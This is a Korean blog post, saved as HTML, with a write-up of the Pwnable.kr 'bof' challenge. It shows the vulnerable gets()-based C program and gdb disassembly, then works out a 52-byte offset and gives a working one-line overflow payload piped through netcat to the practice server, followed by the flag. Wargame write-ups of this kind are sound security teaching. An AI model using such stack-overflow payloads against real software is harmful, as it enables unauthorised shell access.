@@ -1,0 +1,84 @@
+<!DOCTYPE html><html><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-W055DP4N3J"></script><script>
+					window.dataLayer = window.dataLayer || [];
+					function gtag(){dataLayer.push(arguments);}
+					gtag('js', new Date());
+					gtag('config', 'G-W055DP4N3J');</script><head><meta charSet="utf-8"/><meta name="description" content="기록 저장소"/><meta property="og:description" content="기록 저장소"/><meta property="og:url" content="https://mitny.github.io"/><meta property="og:type" content="website"/><meta property="og:locale" content="ko_KR"/><meta property="og:site_name" content="MitNy.log"/><meta name="viewport" content="initial-scale=1.0, width=device-width"/><title>[Pwnable.kr] bof |  MitNy.log</title><meta name="robots" content="index,follow"/><meta property="og:title" content="[Pwnable.kr] bof |  MitNy.log"/><link rel="canonical" href="https://mitny.github.io/articles/2017-08-30-pwnable-bof copy"/><meta name="next-head-count" content="12"/><meta name="naver-site-verification" content="b408dee953bcbbb1038384f191f36dac0551c0fb"/><meta name="google-site-verification" content="vUtYhRYNCWYYTdurCRaVmtnWpPLuXKKwRAm5F6R9sNs"/><link rel="preload" href="/_next/static/css/e6a7c67d207b98b3.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e6a7c67d207b98b3.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-5f4595e5518b5600.js" defer=""></script><script src="/_next/static/chunks/main-005bdf76005efab4.js" defer=""></script><script src="/_next/static/chunks/pages/_app-14a2a9a26060c1d3.js" defer=""></script><script src="/_next/static/chunks/401-9f1400d964d6d7ce.js" defer=""></script><script src="/_next/static/chunks/pages/articles/%5Bdir_slug%5D/%5Bslug%5D-0b7b92862b8a360a.js" defer=""></script><script src="/_next/static/nJPyYqODS0udXw2rMLLyn/_buildManifest.js" defer=""></script><script src="/_next/static/nJPyYqODS0udXw2rMLLyn/_ssgManifest.js" defer=""></script></head><link rel="apple-touch-icon" sizes="57x57" href="/favicon/apple-icon-57x57.png"/><link rel="apple-touch-icon" sizes="60x60" href="/favicon/apple-icon-60x60.png"/><link rel="apple-touch-icon" sizes="72x72" href="/favicon/apple-icon-72x72.png"/><link rel="apple-touch-icon" sizes="76x76" href="/favicon/apple-icon-76x76.png"/><link rel="apple-touch-icon" sizes="114x114" href="/favicon/apple-icon-114x114.png"/><link rel="apple-touch-icon" sizes="120x120" href="/favicon/apple-icon-120x120.png"/><link rel="apple-touch-icon" sizes="144x144" href="/favicon/apple-icon-144x144.png"/><link rel="apple-touch-icon" sizes="152x152" href="/favicon/apple-icon-152x152.png"/><link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-icon-180x180.png"/><link rel="icon" type="image/png" sizes="192x192" href="/favicon/android-icon-192x192.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/favicon/favicon-96x96.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png"/><link rel="manifest" href="/favicon/manifest.json"/><meta name="msapplication-TileColor" content="#ffffff"/><meta name="msapplication-TileImage" content="/favicon/ms-icon-144x144.png"/><meta name="theme-color" content="#ffffff"/><body><div id="__next" data-reactroot=""><div class="header h-16 bg-white drop-shadow-md text-black"><div class="mx-10 pt-3 cursor-pointer"><p class="header-home text-3xl float-left">MitNy.log</p><p class="text-base font-bold pt-2 float-right">About</p></div></div><div class="mx-10 my-8"><div class="w-full min-h-screen pb-24 mt-8"><div class="w-full min-h-screen pb-24 mt-8"><article class="prose max-w-none"><div class="border-b"><p class="text-4xl font-bold mb-0">[Pwnable.kr] bof</p><p class="text-xs text-neutral-500"></p></div><div><p><img src="/assets/posts/pwnkr/bof.png" alt=""></p>
+<p>이름만 봐도 알 수 있는 buffer overflow 문제!
+코드는 다음과 같다.</p>
+<pre class="language-c"><code class="language-c code-highlight"><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdlib.h></span></span>
+</span><span class="code-line">
+</span><span class="code-line"><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>
+</span><span class="code-line">	<span class="token keyword">char</span> overflowme<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+</span><span class="code-line">	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"overflow me : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="code-line">	<span class="token function">gets</span><span class="token punctuation">(</span>overflowme<span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// smash me!</span>
+</span><span class="code-line">	<span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+</span><span class="code-line">		<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="code-line">	<span class="token punctuation">}</span>
+</span><span class="code-line">	<span class="token keyword">else</span><span class="token punctuation">{</span>
+</span><span class="code-line">		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nah..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="code-line">	<span class="token punctuation">}</span>
+</span><span class="code-line"><span class="token punctuation">}</span>
+</span><span class="code-line">
+</span><span class="code-line"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+</span><span class="code-line">	<span class="token function">func</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="code-line">	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+</span><span class="code-line"><span class="token punctuation">}</span>
+</span></code></pre>
+<p>gets함수 부분에 주석으로 smash me!가 있는걸 보니 gets 함수의 취약점을 이용한 bof인 듯 하다.
+main에서 0xdeadbeef 값을 func에 넘겨주고 함수가 실행되는데 <code>key = 0xdeadbeef</code> 이고
+user로 부터 변수 overflowme를 받은 후 <code>key가 0xcafebabe 과 일치할 때</code> 쉘을 실행시킨다.
+그럼 어떻게 해야될까 gdb로 한 번 봐 보자</p>
+<pre><code class="code-highlight"><span class="code-line">mitny@argos-edu:~/pwnable$ gdb -q bof
+</span><span class="code-line">Reading symbols from bof...(no debugging symbols found)...done.
+</span><span class="code-line">(gdb) set disassembly-flavor intel
+</span><span class="code-line">(gdb) disas main
+</span><span class="code-line">Dump of assembler code for function main:
+</span><span class="code-line">   0x0000068a &#x3C;+0>:	push   ebp
+</span><span class="code-line">   0x0000068b &#x3C;+1>:	mov    ebp,esp
+</span><span class="code-line">   0x0000068d &#x3C;+3>:	and    esp,0xfffffff0
+</span><span class="code-line">   0x00000690 &#x3C;+6>:	sub    esp,0x10
+</span><span class="code-line">   0x00000693 &#x3C;+9>:	mov    DWORD PTR [esp],0xdeadbeef
+</span><span class="code-line">   0x0000069a &#x3C;+16>:	call   0x62c &#x3C; func>
+</span><span class="code-line">   0x0000069f &#x3C;+21>:	mov    eax,0x0
+</span><span class="code-line">   0x000006a4 &#x3C;+26>:	leave  
+</span><span class="code-line">   0x000006a5 &#x3C;+27>:	ret    
+</span><span class="code-line">End of assembler dump.
+</span><span class="code-line">(gdb) disas func
+</span><span class="code-line">Dump of assembler code for function func:
+</span><span class="code-line">   0x0000062c &#x3C;+0>:	push   ebp
+</span><span class="code-line">   0x0000062d &#x3C;+1>:	mov    ebp,esp
+</span><span class="code-line">   0x0000062f &#x3C;+3>:	sub    esp,0x48
+</span><span class="code-line">   0x00000632 &#x3C;+6>:	mov    eax,gs:0x14
+</span><span class="code-line">   0x00000638 &#x3C;+12>:	mov    DWORD PTR [ebp-0xc],eax
+</span><span class="code-line">   0x0000063b &#x3C;+15>:	xor    eax,eax
+</span><span class="code-line">   0x0000063d &#x3C;+17>:	mov    DWORD PTR [esp],0x78c
+</span><span class="code-line">   0x00000644 &#x3C;+24>:	call   0x645 &#x3C; func+25>
+</span><span class="code-line">   0x00000649 &#x3C;+29>:	lea    eax,[ebp-0x2c]
+</span><span class="code-line">   0x0000064c &#x3C;+32>:	mov    DWORD PTR [esp],eax
+</span><span class="code-line">   0x0000064f &#x3C;+35>:	call   0x650 &#x3C; func+36>
+</span><span class="code-line">   0x00000654 &#x3C;+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
+</span><span class="code-line">   0x0000065b &#x3C;+47>:	jne    0x66b &#x3C; func+63>
+</span><span class="code-line">   0x0000065d &#x3C;+49>:	mov    DWORD PTR [esp],0x79b
+</span><span class="code-line">   0x00000664 &#x3C;+56>:	call   0x665 &#x3C; func+57>
+</span><span class="code-line">   0x00000669 &#x3C;+61>:	jmp    0x677 &#x3C; func+75>
+</span><span class="code-line">   0x0000066b &#x3C;+63>:	mov    DWORD PTR [esp],0x7a3
+</span><span class="code-line">   0x00000672 &#x3C;+70>:	call   0x673 &#x3C; func+71>
+</span><span class="code-line">   0x00000677 &#x3C;+75>:	mov    eax,DWORD PTR [ebp-0xc]
+</span><span class="code-line">   0x0000067a &#x3C;+78>:	xor    eax,DWORD PTR gs:0x14
+</span><span class="code-line">   0x00000681 &#x3C;+85>:	je     0x688 &#x3C; func+92>
+</span><span class="code-line">   0x00000683 &#x3C;+87>:	call   0x684 &#x3C; func+88>
+</span><span class="code-line">   0x00000688 &#x3C;+92>:	leave  
+</span><span class="code-line">   0x00000689 &#x3C;+93>:	ret    
+</span><span class="code-line">End of assembler dump.
+</span></code></pre>
+<p><code>0x00000654 &#x3C;+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe </code>
+이 부분에서 ebp+0x8 에 있는 값과 0xcafebabe 를 비교해서
+일치하지 않으면 func+63 으로 jump, 일치하면 func+75로 jump를 하게 되는데</p>
+<p>[ebp-0x2c] 와 [ebp+0x8] 사이의 거리는 52!
+즉, 52바이트 만큼 다른 문자를 채워넣고 0xcafebabe 를 넣어 주면 된다.</p>
+<p><code>(python -c 'print "A"*52+"\xbe\xba\xfe\xca"'; cat) |nc pwnable.kr 9000</code> 를 해주면
+<img src="/assets/posts/pwnkr/bof_flag.png" alt=""></p>
+<p>flag가 뜬다!</p>
+<p><code>daddy, I just pwned a buFFer :)</code></p></div></article></div></div></div><footer class="h-16 bg-neutral-500"></footer></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"slug":"2017-08-30-pwnable-bof copy","content":"\n![](/assets/posts/pwnkr/bof.png)\n\n이름만 봐도 알 수 있는 buffer overflow 문제!\n코드는 다음과 같다.\n\n```c\n#include \u003cstdio.h\u003e\n#include \u003cstring.h\u003e\n#include \u003cstdlib.h\u003e\n\nvoid func(int key){\n\tchar overflowme[32];\n\tprintf(\"overflow me : \");\n\tgets(overflowme);\t// smash me!\n\tif(key == 0xcafebabe){\n\t\tsystem(\"/bin/sh\");\n\t}\n\telse{\n\t\tprintf(\"Nah..\\n\");\n\t}\n}\n\nint main(int argc, char* argv[]){\n\tfunc(0xdeadbeef);\n\treturn 0;\n}\n```\n\ngets함수 부분에 주석으로 smash me!가 있는걸 보니 gets 함수의 취약점을 이용한 bof인 듯 하다.\nmain에서 0xdeadbeef 값을 func에 넘겨주고 함수가 실행되는데 `key = 0xdeadbeef` 이고\nuser로 부터 변수 overflowme를 받은 후 `key가 0xcafebabe 과 일치할 때` 쉘을 실행시킨다.\n그럼 어떻게 해야될까 gdb로 한 번 봐 보자\n\n```\nmitny@argos-edu:~/pwnable$ gdb -q bof\nReading symbols from bof...(no debugging symbols found)...done.\n(gdb) set disassembly-flavor intel\n(gdb) disas main\nDump of assembler code for function main:\n   0x0000068a \u003c+0\u003e:\tpush   ebp\n   0x0000068b \u003c+1\u003e:\tmov    ebp,esp\n   0x0000068d \u003c+3\u003e:\tand    esp,0xfffffff0\n   0x00000690 \u003c+6\u003e:\tsub    esp,0x10\n   0x00000693 \u003c+9\u003e:\tmov    DWORD PTR [esp],0xdeadbeef\n   0x0000069a \u003c+16\u003e:\tcall   0x62c \u003c func\u003e\n   0x0000069f \u003c+21\u003e:\tmov    eax,0x0\n   0x000006a4 \u003c+26\u003e:\tleave  \n   0x000006a5 \u003c+27\u003e:\tret    \nEnd of assembler dump.\n(gdb) disas func\nDump of assembler code for function func:\n   0x0000062c \u003c+0\u003e:\tpush   ebp\n   0x0000062d \u003c+1\u003e:\tmov    ebp,esp\n   0x0000062f \u003c+3\u003e:\tsub    esp,0x48\n   0x00000632 \u003c+6\u003e:\tmov    eax,gs:0x14\n   0x00000638 \u003c+12\u003e:\tmov    DWORD PTR [ebp-0xc],eax\n   0x0000063b \u003c+15\u003e:\txor    eax,eax\n   0x0000063d \u003c+17\u003e:\tmov    DWORD PTR [esp],0x78c\n   0x00000644 \u003c+24\u003e:\tcall   0x645 \u003c func+25\u003e\n   0x00000649 \u003c+29\u003e:\tlea    eax,[ebp-0x2c]\n   0x0000064c \u003c+32\u003e:\tmov    DWORD PTR [esp],eax\n   0x0000064f \u003c+35\u003e:\tcall   0x650 \u003c func+36\u003e\n   0x00000654 \u003c+40\u003e:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe\n   0x0000065b \u003c+47\u003e:\tjne    0x66b \u003c func+63\u003e\n   0x0000065d \u003c+49\u003e:\tmov    DWORD PTR [esp],0x79b\n   0x00000664 \u003c+56\u003e:\tcall   0x665 \u003c func+57\u003e\n   0x00000669 \u003c+61\u003e:\tjmp    0x677 \u003c func+75\u003e\n   0x0000066b \u003c+63\u003e:\tmov    DWORD PTR [esp],0x7a3\n   0x00000672 \u003c+70\u003e:\tcall   0x673 \u003c func+71\u003e\n   0x00000677 \u003c+75\u003e:\tmov    eax,DWORD PTR [ebp-0xc]\n   0x0000067a \u003c+78\u003e:\txor    eax,DWORD PTR gs:0x14\n   0x00000681 \u003c+85\u003e:\tje     0x688 \u003c func+92\u003e\n   0x00000683 \u003c+87\u003e:\tcall   0x684 \u003c func+88\u003e\n   0x00000688 \u003c+92\u003e:\tleave  \n   0x00000689 \u003c+93\u003e:\tret    \nEnd of assembler dump.\n```\n`0x00000654 \u003c+40\u003e:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe `\n이 부분에서 ebp+0x8 에 있는 값과 0xcafebabe 를 비교해서 \n일치하지 않으면 func+63 으로 jump, 일치하면 func+75로 jump를 하게 되는데\n\n[ebp-0x2c] 와 [ebp+0x8] 사이의 거리는 52!\n즉, 52바이트 만큼 다른 문자를 채워넣고 0xcafebabe 를 넣어 주면 된다.\n\n`(python -c 'print \"A\"*52+\"\\xbe\\xba\\xfe\\xca\"'; cat) |nc pwnable.kr 9000` 를 해주면\n![](/assets/posts/pwnkr/bof_flag.png)\n\nflag가 뜬다!\n\n`daddy, I just pwned a buFFer :)`\n","layout":"post","title":"[Pwnable.kr] bof","categories":["Pwnable.kr"],"excerpt":" ","comments":true,"share":true,"tags":["Pwnable.kr","bof"]}},"__N_SSG":true},"page":"/articles/[dir_slug]/[slug]","query":{"dir_slug":"2017-08","slug":"pwnable-bof copy"},"buildId":"nJPyYqODS0udXw2rMLLyn","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
